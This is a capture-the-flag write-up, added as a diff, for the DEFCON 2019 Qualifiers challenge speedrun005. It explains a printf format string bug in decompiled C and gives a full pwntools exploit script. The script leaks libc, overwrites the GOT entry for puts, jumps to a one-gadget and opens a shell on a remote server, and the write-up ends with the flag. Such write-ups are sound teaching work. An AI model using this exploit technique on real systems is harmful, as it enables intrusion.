@@ -1,0 +1,100 @@
+<!--Solve date: 08/19/2021-->
+
+<h1>DEFCON 2019 Qualifiers - speedrun005</h1>
+
+<h2>Binary Exploitation - 5 pts (speedrun)</h2>
+
+<h3>Writeup by YR81</h3>
+
+<p class = "tldr">Summary. Format string attack. Arbitrary write to GOT and spawn shell.</p>
+
+<h4>Discussion</h4>
+
+<p>This is problem features a format string vulnerability. The source code (as decompiled by IDA) for the vulnerable section is listed below.</p>
+
+<pre class = "c">
+__int64 sub_40072D()
+{
+    char buf; // [sp+0h] [bp-410h]@1
+    __int64 v2; // [sp+408h] [bp-8h]@1
+
+    v2 = *MK_FP(__FS__, 40LL);
+    printf("What do you mean this time? ");
+    read(0, &buf, 0x400uLL);
+    printf("Interesting ", &buf);
+    printf(&buf);
+    puts(" food for thought");
+    return *MK_FP(__FS__, 40LL) ^ v2;
+}
+</pre>
+
+<h4></h4>
+
+<p>The line <code>printf(&buf);</code> treats our payload as the format control argument, allowing us to leak addresses and make arbitrary writes. The program has PIE disabled and only partial RELRO protections, so with the first part of our payload, we can (1) leak the address of libc and (2) overwrite the global offset table (GOT) entry for <code>puts()</code> to point to the beginning of the vulnerable function so that we can exploit it once again. Note that there <i>cannot be another call to <code>puts()</code></i> between what we overwrite <code>puts()</code> with and the call to <code>printf()</code>. Otherwise, we would simply infinite-loop and stack-overflow. Returning to the beginning of the vulnerable function here works fine, as the message <code>What do you mean this time? </code> is printed with <code>printf()</code> rather than <code>puts()</code>.</p>
+
+<p>The second time we reach <code>printf()</code>, we have knowledge of the address of libc and can now <code>puts()</code> with a one-gadget, making sure we satisfy the requirements. The libc version running on the remote server is <code>libc-2.27.so</code>, the first revision. A useful one-gadget is at <code>0x10a38c</code>, which has only the requirement that <code>qword ptr [rsp + 0x70]</code> is NULL. This is easily satisfiable because we have control over that memory region as part of our buffer.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+from pwn import *
+
+ready = True
+debug = True
+if ready:
+    target, port = "34.212.244.12", 31337
+    p = remote(target, port)
+    libc = ELF("./libc-2.27.so")
+    libc_start_main_offs_libc = 0x21b97
+    one_gadget_offs_libc = 0x10a38c
+else:
+    procname = "./speedrun5"
+    p = process(procname)
+    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+    libc_start_main_offs_libc = 0x21b97
+    one_gadget_offs_libc = 0x10a45c
+    if debug:
+        context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", "-e"]
+        gdb.attach(p, gdbscript = """
+        
+        """)
+
+
+
+# exploit goes here
+# lambdas and funcdefs
+flush = lambda: p.recvuntil(b"? ")
+vuln = 0x40072d
+puts_got = 0x601020
+
+# payloads
+flush()
+p.send((b"%%1$%dx%%14$hn%%1$%dx%%15$hn%%1$%dx%%16$hn|%%141$p|" % (
+    ((vuln >> 0) - 0) % (1 << 16), 
+    ((vuln >> 16) - (vuln >> 0)) % (1 << 16), 
+    ((vuln >> 32) - (vuln >> 16)) % (1 << 16)
+    )).ljust(0x40, b'\x00') + 
+        p64(puts_got) + p64(puts_got + 2) + p64(puts_got + 4))
+
+p.recvuntil(b'|')
+libc.address = int(p.recvuntil(b'|')[: -1], 16) - libc_start_main_offs_libc
+log.info("Libc: 0x%x" % (libc.address))
+one_gadget = one_gadget_offs_libc + libc.address
+
+flush()
+p.send((b"%%1$%dx%%14$hn%%1$%dx%%15$hn%%1$%dx%%16$hn|" % (
+    ((one_gadget >> 0) - 0) % (1 << 16), 
+    ((one_gadget >> 16) - (one_gadget >> 0)) % (1 << 16), 
+    ((one_gadget >> 32) - (one_gadget >> 16)) % (1 << 16), 
+    )).ljust(0x40, b'\x00') + 
+        p64(puts_got) + p64(puts_got + 2) + p64(puts_got + 4) + 
+        0x200 * b'\x00')
+
+p.recvuntil(b'|')
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>OOO{$ will come and go. W3 all know that. The most important thing in LYfe will always be the people in this competition. Right here, right now..._pwning_}</code></p>
